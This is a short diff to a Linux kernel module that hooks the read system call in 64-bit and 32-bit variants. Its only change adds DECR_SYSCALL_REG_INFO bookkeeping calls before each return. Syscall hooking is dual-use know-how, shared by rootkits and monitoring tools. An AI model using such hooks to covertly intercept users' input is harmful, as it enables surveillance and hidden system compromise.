@@ -19,6 +19,8 @@ asmlinkage ssize_t hooked_sys_read(unsigned int fd, char __user *buf, size_t cou
 
 	if(!is_active()){
 
+		DECR_SYSCALL_REG_INFO(__NR_read);
+
 		return r;
 
 	}else{
@@ -49,6 +51,8 @@ asmlinkage ssize_t hooked_sys_read(unsigned int fd, char __user *buf, size_t cou
 
 		activate();
 
+		DECR_SYSCALL_REG_INFO(__NR_read);
+
 		return r;
 
 	}
@@ -64,6 +68,8 @@ asmlinkage ssize_t hooked_sys_read32(unsigned int fd, char __user *buf, size_t c
 	r = (*real_sys_read32)(fd, buf, count);
 
 	if(!is_active()){
+
+		DECR_SYSCALL_REG_INFO(__NR32_read);
 
 		return r;
 
@@ -95,6 +101,8 @@ asmlinkage ssize_t hooked_sys_read32(unsigned int fd, char __user *buf, size_t c
 		kfree(i);
 
 		activate();
+
+		DECR_SYSCALL_REG_INFO(__NR32_read);
 
 		return r;
 	}
